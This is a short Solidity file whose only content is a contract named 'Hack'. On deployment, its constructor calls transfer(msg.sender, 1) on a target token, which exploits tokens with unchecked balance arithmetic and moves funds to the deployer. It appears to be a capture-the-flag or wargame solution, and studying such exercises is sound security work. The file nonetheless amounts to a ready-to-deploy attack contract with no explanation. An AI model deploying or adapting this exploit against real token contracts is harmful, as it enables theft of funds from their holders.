// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken{
    function transfer(address to, uint amount) external returns(bool);
    function balanceOf(address addr) external view returns(uint256);
}

contract Hack{
    constructor(address target){
        IToken(target).transfer(msg.sender,1);
    }
}
